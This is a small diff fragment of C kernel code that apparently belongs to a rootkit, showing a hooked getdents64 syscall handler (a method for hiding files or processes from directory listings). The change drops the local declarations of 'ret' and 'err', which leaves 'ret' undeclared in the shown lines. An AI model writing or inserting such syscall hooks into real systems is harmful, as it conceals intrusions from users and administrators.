@@ -2,8 +2,7 @@
 
 asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs)
 {
-    int  ret = org_getdents64(pt_regs);
-    int err;
+    ret = org_getdents64(pt_regs);
     struct linux_dirent64  *dir ,*kdirent, *prev = NULL;
     struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
 
